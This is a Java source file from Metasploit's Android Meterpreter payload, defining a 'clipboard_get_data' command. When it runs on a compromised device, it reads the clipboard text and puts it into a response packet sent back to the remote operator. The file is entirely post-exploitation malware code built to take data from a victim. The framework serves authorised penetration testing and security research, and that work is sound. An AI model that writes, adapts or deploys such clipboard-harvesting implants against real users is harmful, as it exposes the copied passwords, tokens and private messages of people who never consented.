
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.ClipManager;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class clipboard_get_data implements Command {

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, final TLVPacket response) throws Exception {
        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter)meterpreter;
        ClipManager clipManager = androidMeterpreter.getClipManager();
        if (clipManager == null) {
            return ERROR_FAILURE;
        }

        String text = clipManager.getText();
        if (text != null) {
            TLVPacket pckt = new TLVPacket();
            pckt.add(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, text);
            response.addOverflow(TLVType.TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, pckt);
        }
        return ERROR_SUCCESS;

    }
}

